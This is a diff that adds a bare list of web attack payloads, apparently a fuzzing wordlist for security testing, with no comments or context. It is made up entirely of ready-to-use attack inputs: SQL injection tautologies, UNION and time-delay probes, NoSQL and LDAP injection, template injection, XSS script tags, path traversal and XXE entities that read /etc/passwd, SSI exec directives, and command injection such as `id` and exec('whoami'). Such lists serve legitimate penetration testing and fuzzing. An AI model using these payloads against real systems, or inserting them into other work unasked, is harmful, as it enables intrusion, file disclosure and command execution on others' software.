@@ -1,0 +1,91 @@
+"
+""
+#
+'
+''
+'='
+*)(&
++
+,
+-- -
+/
+/*
+/*…*/
+//
+;
+<
+>
+\
+\\
+`
+@
+``
+{
+{{
+||
+}
+}}
+' } ], $comment:'successful MongoDB injection'
+;{$_GET["cmd"]}
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+'=0--+
+%00
+;%00
+1, $where: '1 == 1'
+1*56
+1-false
+1' ORDER BY 1--
+1' ORDER BY 1--
+1-true
+-1' UNION SELECT 1,2,3--+
+-1 UNION SELECT 1 INTO @,@,@
+-2
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%27
+%2c
+%2c(select%20*%20from%20(select(sleep(10)))a)
+{{6*'3'}}
+admin' #
+admin' --
+admin'/*
+AND 0
+AND 1
+AND false
+' AND id IS NULL; --
+' AND MID(VERSION(),1,1) = '5';
+AND true
+<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>
+../../../../../../../../etc/passwd
+../../../../../../../../etc/passwd%00
+<!--#exec cmd="ls" -->
+exec('whoami');
+' GROUP BY columnnames having 1=1 --
+`id`
+|id
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<!--#include file="../../../../../../../etc/passwd" -->
+'LIKE'
+</nowiki>
+' or "
+-- or #
+" OR "" = "
+' OR '' = '
+' OR '1
+' OR 1 -- -
+ OR 1=1
+" OR 1 = 1 -- -
+' OR 1=1#
+' OR 1=1--
+' OR 1=1/*
+' or 'x'='x
+' OR 'x'='x
+"}}</script>'
+}}</script>""'"
+<script>alert('XSS')</script>
+}}</script><script>alert(1);</script></body></html><!--
+,(select * from (select(sleep(10)))a)
+_self_
+*)(uid=*))(|(uid=*
+'''''''''''''UNION SELECT '2
+';WAITFOR DELAY '0:0:30'--
